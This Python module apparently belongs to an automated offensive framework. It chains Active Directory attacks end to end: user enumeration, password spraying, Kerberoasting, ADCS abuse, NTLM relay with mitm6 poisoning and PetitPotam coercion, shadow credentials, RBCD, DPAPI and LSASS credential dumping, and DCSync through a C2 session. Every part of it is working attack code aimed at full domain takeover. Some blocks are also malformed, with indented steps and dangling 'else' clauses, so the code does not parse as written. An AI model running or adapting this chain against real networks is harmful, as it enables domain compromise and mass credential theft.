import asyncio, logging, re
from typing import Optional

from orchestrator.brain.phases.models import Finding, Severity
from orchestrator.kali_tools_client import kali
from orchestrator.ad.toolkit import get_ad_toolkit
from orchestrator.ad.certipy_wrapper import CertipyWrapper
from orchestrator.ad.petitpotam import PetitPotam
from orchestrator.ad.shadow_creds import ShadowCredentials
from orchestrator.ad.rbcd import RBCD
from orchestrator.ad.pywhisker_wrapper import PywhiskerWrapper, BloodyadWrapper, Mitm6Wrapper, CoercerWrapper, LsassyWrapper
from orchestrator.ad.ntlm_relay import NtlmRelayxWrapper, NtlmRelayChain
from orchestrator.c2.manager import get_c2

logger = logging.getLogger("ad_kill_chain")


def _extract_domain(findings: list[Finding]) -> str:
    for f in findings or []:
        if f.type == "domain_info" and f.evidence:
            return f.evidence.strip()
        desc = (f.description + " " + f.evidence).lower()
        m = re.search(r'domain[:\s]+(\S+\.\S+)', desc)
        if m:
            return m.group(1)
    return ""


def _extract_dc_ip(findings: list[Finding]) -> str:
    for f in findings or []:
        if f.type == "domain_controller":
            return f.host or f.evidence.strip()
        if f.type == "open_port" and f.port == 389 and f.host:
            return f.host
        if f.type == "open_port" and f.port == 636 and f.host:
            return f.host
    return ""


def _extract_creds(findings: list[Finding]) -> list[dict]:
    creds = []
    for f in findings or []:
        if f.type in ("credential", "password") and f.evidence:
            parts = f.evidence.split(":")
            if len(parts) >= 2:
                creds.append({"user": parts[0].strip(), "password": ":".join(parts[1:]).strip()})
        if f.type == "cracked_hash" and f.payload and ":" in f.payload:
            parts = f.payload.split(":", 1)
            creds.append({"user": parts[0], "password": parts[1]})
    return creds


step_descriptions = {
    "kerbrute": "Enumerate valid AD users via Kerberos pre-auth",
    "spray": "Password spray against discovered users",
    "bloodhound": "Collect AD graph data for analysis",
    "certipy_esc": "ADCS abuse (ESC1-ESC8) to get DA cert",
    "petitpotam": "Coerce NTLM auth from DC via MS-EFSRPC",
    "shadow_creds": "Add KeyCredential to machine account",
    "rbcd": "Resource-Based Constrained Delegation abuse",
    "dcsync": "DCSync — replicate domain hashes",
}


async def run_chain(target: str, findings: list[Finding] = None,
                    domain: str = "", dc_ip: str = "",
                    creds: list[dict] = None) -> dict:
    chain_findings = []
    steps = {}
    ad = get_ad_toolkit()
    c2 = get_c2()
    certipy = CertipyWrapper()
    petitpotam = PetitPotam()
    shadow = ShadowCredentials()
    rbcd = RBCD()
    pywhisker = PywhiskerWrapper()
    lsassy = LsassyWrapper()
    from orchestrator.scanners.dns_wrappers import LdapDomainDumpWrapper
    from orchestrator.scanners.web_wrappers import KerberoastWrapper
    from orchestrator.scanners.cracking_wrappers import DonPapiWrapper, Mitm6Wrapper, Krb5Wrapper
    ldap_dump = LdapDomainDumpWrapper()
    kerberoast_tool = KerberoastWrapper()
    donpapi = DonPapiWrapper()
    mitm6 = Mitm6Wrapper()
    krb5 = Krb5Wrapper()

    if not domain:
        domain = _extract_domain(findings)
    if not dc_ip:
        dc_ip = _extract_dc_ip(findings)
    if not creds:
        creds = _extract_creds(findings)

    dc_target = dc_ip or target

    # Step 0: LDAP domain dump
    logger.info("  [AD chain] Step 0: ldapdomaindump — enumerate AD objects")
    if dc_target and creds:
        try:
            ld_result = await ldap_dump.dump(dc_target, creds[0]["user"],
                                              password=creds[0].get("password", ""),
                                              domain=domain, timeout=120)
            steps["ldapdomaindump"] = ld_result
            if ld_result["success"]:
                chain_findings.append(Finding(
                    phase="ad_chain", type="ldap_dump", target=target,
                    severity=Severity.HIGH,
                    description=f"LDAP domain dump completed: {', '.join(ld_result['files'])}",
                ))
        except Exception as e:
            steps["ldapdomaindump"] = {"success": False, "error": str(e)}

    # Step 1: Kerbrute — enumerate users
    logger.info("  [AD chain] Step 1: kerbrute — enumerate users")
    try:
        krb_args = f"{domain} --dc-ip {dc_target} -o /tmp/krb_users.txt -d /tmp/kerbrute_sink"
        krb_result = await kali.run("kerbrute", f"userenum /usr/share/wordlists/kerbrute_users.txt {krb_args}", timeout=120)
        krb_stdout = (krb_result.get("stdout") or "") + (krb_result.get("stderr") or "")
        users = re.findall(r'VALID USER:\s*(\S+)', krb_stdout)
        steps["kerbrute"] = {"success": len(users) > 0, "users_found": len(users), "users": users[:20]}
        if users:
            chain_findings.append(Finding(
                phase="ad_chain", type="kerbrute_users", target=target,
                severity=Severity.HIGH,
                description=f"Kerbrute: {len(users)} valid users in {domain}",
                evidence="\n".join(users[:20]),
            ))
    except Exception as e:
        steps["kerbrute"] = {"success": False, "error": str(e)}

    # Step 1b: Kerberoast (tool) + krb5 ticket operations
    if creds and dc_target:
        try:
            kr_result = await kerberoast_tool.roast(dc_target, creds[0]["user"],
                                                     creds[0].get("password", ""),
                                                     domain=domain, timeout=120)
            steps["kerberoast_tool"] = kr_result
            for h in kr_result.get("hashes", []):
                chain_findings.append(Finding(
                    phase="ad_chain", type="kerberoast_hash", target=target,
                    severity=Severity.HIGH,
                    description="Kerberoast hash extracted",
                    evidence=h[:80],
                ))
        except Exception as e:
            steps["kerberoast_tool"] = {"success": False, "error": str(e)}

        try:
            tgt = domain.split(".")[0] if domain else ""
            kinit_result = await krb5.kinit(creds[0]["user"], creds[0].get("password", ""), tgt, timeout=30)
            steps["krb5_init"] = kinit_result
            if kinit_result["success"]:
                klist_result = await krb5.klist(timeout=15)
                if klist_result["success"]:
                    steps["krb5_tickets"] = klist_result
                    chain_findings.append(Finding(
                        phase="ad_chain", type="krb5_ticket", target=target,
                        severity=Severity.INFO,
                        description=f"Kerberos tickets: {', '.join(klist_result['tickets'][:5])}",
                    ))
        except Exception as e:
            steps["krb5"] = {"success": False, "error": str(e)}

    # Step 2: Spray (if we have creds)
    logger.info("  [AD chain] Step 2: spray — password spray")
    if creds:
        from orchestrator.chains.credential_spray import spray
        spray_findings = await spray(creds, [target], primary_target=target, findings=findings)
        chain_findings.extend(spray_findings)
        steps["spray"] = {
            "success": len(spray_findings) > 0,
            "valid_logins": len([f for f in spray_findings if "success" in f.type]),
        }
    else:
        steps["spray"] = {"success": False, "note": "No credentials to spray"}

    # Step 3: BloodHound data collection
    logger.info("  [AD chain] Step 3: bloodhound — collect graph data")
    try:
        bh_args = f"-d {domain} --dc-ip {dc_target} -c all"
        if creds:
            bh_args += f" -u {creds[0]['user']} -p {creds[0]['password']}"
        bh_result = await kali.run("bloodhound-python", bh_args, timeout=300)
        bh_stdout = (bh_result.get("stdout") or "") + (bh_result.get("stderr") or "")
        steps["bloodhound"] = {
            "success": "done" in bh_stdout.lower() or "wrote" in bh_stdout.lower(),
            "output": bh_stdout[:2000],
        }
        if steps["bloodhound"]["success"]:
            chain_findings.append(Finding(
                phase="ad_chain", type="bloodhound_collected", target=target,
                severity=Severity.INFO,
                description="BloodHound AD graph data collected",
            ))
    except Exception as e:
        steps["bloodhound"] = {"success": False, "error": str(e)}

    # Step 4: Certipy — ADCS ESC enumeration and exploitation
    logger.info("  [AD chain] Step 4: certipy — ADCS abuse")
    if creds:
        try:
            cert_result = await certipy.auto_esc(
                dc_target, creds[0]["user"], creds[0].get("password", ""),
                dc_ip=dc_target, timeout=240)
            steps["certipy_esc"] = {
                "success": any(r.get("success") and r.get("nt_hash") for r in cert_result),
                "results": [
                    {"step": "find" if i == 0 else "req" if i == 1 else "auth",
                     "success": r.get("success"), "hash": r.get("nt_hash", "")[:20] if r.get("nt_hash") else None}
                    for i, r in enumerate(cert_result)
                ],
            }
            for r in cert_result:
                if r.get("nt_hash"):
                    chain_findings.append(Finding(
                        phase="ad_chain", type="adcs_da_hash", target=target,
                        severity=Severity.CRITICAL,
                        description=f"ADCS ESC abuse: DA hash obtained via Certipy",
                        evidence=f"user: {r.get('user', '')} | hash: {r.get('nt_hash', '')[:20]}***",
                    ))
        except Exception as e:
            steps["certipy_esc"] = {"success": False, "error": str(e)}
    else:
        steps["certipy_esc"] = {"success": False, "note": "Need credentials for Certipy"}

    # Step 4b: start ntlmrelayx → LDAP relay listener (runs in background)
    logger.info("  [AD chain] Step 4b: ntlmrelayx — start LDAP relay listener")
    ntlm_relayx = NtlmRelayxWrapper()
    relay_port = 8445
    relay_future = None
    if dc_target:
        try:
            relay_user = creds[0]["user"] if creds else ""
            relay_future = asyncio.create_task(
                ntlm_relayx.start_ldap_relay(
                    dc_target, listen_port=relay_port,
                    delegate_access=True,
                    escalate_user=relay_user,
                    timeout=240,
                )
            )
            await asyncio.sleep(3)  # give ntlmrelayx time to bind
            steps["ntlmrelayx"] = {"success": True, "listener": f"0.0.0.0:{relay_port} -> ldap://{dc_target}"}
        except Exception as e:
            steps["ntlmrelayx"] = {"success": False, "error": str(e)}
    else:
        steps["ntlmrelayx"] = {"success": False, "note": "No DC target for relay"}

    # Step 4c: mitm6 — IPv6 DNS poisoning for relay
    logger.info("  [AD chain] Step 4c: mitm6 — IPv6 DNS poisoning")
    if domain:
        try:
            m6_result = await mitm6.poison(domain, timeout=60)
            steps["mitm6"] = m6_result
            if m6_result["success"]:
                chain_findings.append(Finding(
                    phase="ad_chain", type="mitm6_capture", target=target,
                    severity=Severity.CRITICAL,
                    description=f"mitm6: captured auth via IPv6 poisoning",
                ))
        except Exception as e:
            steps["mitm6"] = {"success": False, "error": str(e)}

    # Step 5: PetitPotam — coerce NTLM auth (relayed via ntlmrelayx if running)
    logger.info("  [AD chain] Step 5: petitpotam — coerce NTLM auth → relay")
    try:
        sessions = await c2.refresh_sessions()
        listener = sessions[0].address.split(":")[0] if sessions else "0.0.0.0"
        if dc_target:
            pp_result = await petitpotam.coerce(
                dc_target, f"{listener}:{relay_port}",
                username=creds[0]["user"] if creds else "",
                password=creds[0].get("password", "") if creds else "",
                domain=domain, timeout=120)
            steps["petitpotam"] = pp_result
            if pp_result["success"]:
                chain_findings.append(Finding(
                    phase="ad_chain", type="petitpotam_coerced", target=target,
                    severity=Severity.CRITICAL,
                    description=f"PetitPotam: {dc_target} coerced NTLM auth to {listener}:{relay_port}",
                ))
                # Collect relay result
                if relay_future:
                    try:
                        relay_result = await asyncio.wait_for(relay_future, timeout=15)
                        steps["ntlmrelayx_result"] = relay_result
                        if relay_result.get("success"):
                            for conn in relay_result.get("relayed_connections", []):
                                chain_findings.append(Finding(
                                    phase="ad_chain", type="ntlm_relayed", target=target,
                                    severity=Severity.CRITICAL,
                                    description=f"NTLM relay: {conn}",
                                ))
                    except asyncio.TimeoutError:
                        steps["ntlmrelayx_result"] = {"success": False, "note": "Relay ongoing, no result yet"}
        else:
            steps["petitpotam"] = {"success": False, "note": "No DC target"}
    except Exception as e:
        steps["petitpotam"] = {"success": False, "error": str(e)}

    # Step 5b: Pywhisker alternative for Shadow Credentials
    logger.info("  [AD chain] Step 5b: pywhisker — shadow credentials via PKINIT")
    if creds and dc_target:
        try:
            pw_result = await pywhisker.add_keycredential(
                dc_target, creds[0]["user"], password=creds[0].get("password", ""),
                domain=domain, dc_ip=dc_target,
                target_user=f"{dc_target.split('.')[0]}$" if "." in dc_target else f"{dc_target}$",
                timeout=120)
            steps["pywhisker"] = pw_result
            if pw_result.get("pfx_path"):
                from ..ad.certipy_wrapper import CertipyWrapper
                cw = CertipyWrapper()
                auth_result = await cw.auth(pw_result["pfx_path"], domain.split(".")[0], dc_ip=dc_target, timeout=120)
                if auth_result.get("nt_hash"):
                    steps["pywhisker_auth"] = auth_result
                    chain_findings.append(Finding(
                        phase="ad_chain", type="pywhisker_hash", target=target,
                        severity=Severity.CRITICAL,
                        description=f"PyWhisker: NT hash for target machine via PKINIT",
                        evidence=f"hash: {auth_result['nt_hash'][:20]}***",
                    ))
        except Exception as e:
            steps["pywhisker"] = {"success": False, "error": str(e)}

    # Step 6: Shadow Credentials
        try:
            target_computer = f"{dc_target.split('.')[0]}$" if "." in dc_target else f"{dc_target}$"
            sc_result = await shadow.auto(
                dc_target, target_computer,
                creds[0]["user"], password=creds[0].get("password", ""),
                domain=domain, dc_ip=dc_target, timeout=240)
            steps["shadow_creds"] = sc_result
            last = list(sc_result.values())[-1] if sc_result else {}
            if last.get("nt_hash"):
                chain_findings.append(Finding(
                    phase="ad_chain", type="shadow_cred_hash", target=target,
                    severity=Severity.CRITICAL,
                    description=f"Shadow Credentials: NT hash for {target_computer}",
                    evidence=f"hash: {last['nt_hash'][:20]}***",
                ))
        except Exception as e:
            steps["shadow_creds"] = {"success": False, "error": str(e)}
    else:
        steps["shadow_creds"] = {"success": False, "note": "Need credentials + DC target"}

    # Step 7: RBCD
    logger.info("  [AD chain] Step 7: rbcd — constrained delegation")
    if creds and dc_target:
        try:
            attacker_comp = f"ATTACKER${__import__('uuid').uuid4().hex[:6].upper()}"
            rbcd_result = await rbcd.exploit(
                dc_target, f"{dc_target.split('.')[0]}$" if "." in dc_target else f"{dc_target}$",
                attacker_comp, creds[0].get("password", "Password123!"),
                username=creds[0]["user"], password=creds[0].get("password", ""),
                domain=domain, dc_ip=dc_target, timeout=300)
            steps["rbcd"] = rbcd_result
            if rbcd_result.get("dcsync", {}).get("hashes"):
                for h in rbcd_result["dcsync"]["hashes"][:10]:
                    parts = h.split(":")
                    if len(parts) >= 4:
                        chain_findings.append(Finding(
                            phase="ad_chain", type="rbcd_dcsync", target=target,
                            severity=Severity.CRITICAL,
                            description=f"RBCD → DCSync: {parts[0]} hash obtained",
                            evidence=f"hash: {parts[3][:20]}***",
                        ))
        except Exception as e:
            steps["rbcd"] = {"success": False, "error": str(e)}
    else:
        steps["rbcd"] = {"success": False, "note": "Need credentials + DC target"}

    # Step 7a: DonPAPI — DPAPI credential extraction
    logger.info("  [AD chain] Step 7a: donpapi — DPAPI credential extraction")
    if dc_target and creds:
        try:
            dp_result = await donpapi.dump(dc_target, creds[0]["user"],
                                            password=creds[0].get("password", ""),
                                            domain=domain, timeout=120)
            steps["donpapi"] = dp_result
            for cred_str in dp_result.get("credentials", []):
                chain_findings.append(Finding(
                    phase="ad_chain", type="dpapi_credential", target=target,
                    severity=Severity.CRITICAL,
                    description=f"DonPAPI: DPAPI credential extracted",
                    evidence=cred_str[:80],
                ))
        except Exception as e:
            steps["donpapi"] = {"success": False, "error": str(e)}

    # Step 7b: LSASSY — dump credentials from memory
    logger.info("  [AD chain] Step 7b: lsassy — dump creds from memory")
    if creds and dc_target:
        try:
            lsassy_result = await lsassy.dump(dc_target, creds[0]["user"],
                                               password=creds[0].get("password", ""), timeout=120)
            steps["lsassy"] = lsassy_result
            for h in lsassy_result.get("hashes", []):
                chain_findings.append(Finding(
                    phase="ad_chain", type="lsassy_hash", target=target,
                    severity=Severity.CRITICAL,
                    description=f"lsassy: credential dump from {dc_target}",
                    evidence=h[:80],
                ))
        except Exception as e:
            steps["lsassy"] = {"success": False, "error": str(e)}

    # Step 8: DCSync
        addr = sessions[0].address.split(":")[0] if sessions else ""
        session_id = sessions[0].id if sessions else ""
        try:
            if sessions:
                dcsync_result = await c2.execute(session_id, f"secretsdump -just-dc {domain}/{creds[0]['user']}:{creds[0]['password']}@{dc_target}")
            else:
                dcsync_result = await ad.secretsdump(dc_target, creds[0]["user"], creds[0].get("password", ""), domain=domain)
            dcsync_output = dcsync_result.output if hasattr(dcsync_result, 'output') else str(dcsync_result.get("stdout", ""))
            steps["dcsync"] = {"success": bool(dcsync_output), "output": dcsync_output[:2000]}
            hashes = re.findall(r'(\w+:\d+:\w{32}:\w{32}:::)', dcsync_output)
            for h in hashes[:10]:
                parts = h.split(":")
                if len(parts) >= 4:
                    chain_findings.append(Finding(
                        phase="ad_chain", type="dcsync_hash", target=target,
                        severity=Severity.CRITICAL,
                        description=f"DCSync: {parts[0]} domain hash",
                        evidence=f"hash: {parts[3]}",
                    ))
        except Exception as e:
            steps["dcsync"] = {"success": False, "error": str(e)}
    else:
        steps["dcsync"] = {"success": False, "note": "Need credentials for DCSync"}

    successful_steps = sum(1 for s in steps.values() if isinstance(s, dict) and s.get("success"))
    return {
        "domain": domain,
        "dc_ip": dc_target,
        "steps": steps,
        "findings": [f.to_dict() for f in chain_findings],
        "successful_steps": successful_steps,
        "total_steps": len(steps),
        "dominion_achieved": any(
            s.get("success") for s in steps.values()
            if isinstance(s, dict) and ("hash" in str(s) or "downgrade" in str(s) or "nt_hash" in str(s.get("results", [])))
        ),
    }
